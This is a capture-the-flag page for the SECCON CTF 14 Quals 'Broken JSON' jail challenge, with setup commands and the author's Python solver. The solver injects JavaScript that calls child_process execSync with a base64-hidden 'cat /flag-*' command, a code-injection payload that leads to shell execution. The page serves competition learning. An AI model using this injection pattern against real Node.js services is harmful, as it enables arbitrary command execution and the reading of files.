---
title: "Broken JSON - SECCON CTF 14 Quals 2025"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "base64", "broken", "json", "misc", "seccon-ctf-14-quals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/jail/broken-json"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Quals"
  year: 2025
  challenge: "Broken JSON"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/jail/broken-json>
- **CTF:** SECCON CTF 14 Quals 2025

---

# [jail] broken-json

## Description

Break Time ☕

```
nc broken-json.seccon.games 5000
```

## Attachments

- [broken-json](distfiles)

## Usage

Launch a challenge server:
```sh
cd build
docker compose up
```

Run the author's solver:
```sh
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=5000 \
    --network=host \
    (docker build -q ./solution)
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202512_SECCON_CTF_14_Quals/jail/broken-json/solution/solve.py>

```python
import ptrlib
import os
import base64

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

cmd = b"cat /flag-*"
code = f"""
/"; console.log(process.getBuiltinModule("child_process").execSync(atob("{base64.b64encode(cmd).decode()}")).toString()); "/
""".strip()

io.sendlineafter(b"jail> ", code.encode())
print(io.recvline().decode().split())
```
